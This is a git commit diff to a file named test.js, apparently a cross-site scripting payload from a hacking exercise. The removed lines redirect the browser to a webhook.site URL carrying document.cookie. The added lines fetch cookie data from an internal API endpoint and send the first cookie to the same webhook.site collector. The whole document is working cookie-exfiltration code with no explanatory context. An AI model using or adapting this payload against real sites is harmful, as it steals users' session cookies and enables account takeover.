b7af93ea170c699039e538ef8950d2835d76880f
wldldlq <smjy01@gmail.com>
2024-10-14 15:42:55 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,7 @@
-var cookieValue = document.cookie;
-location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=".concat(cookieValue);
+fetch("/api/v1/my_cookie_info")
+    .then((response) => response.json())
+    .then((data) => {
+        
+        var cookie = data.cookies[0];
+        location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=" + encodeURIComponent(cookie);
+    });
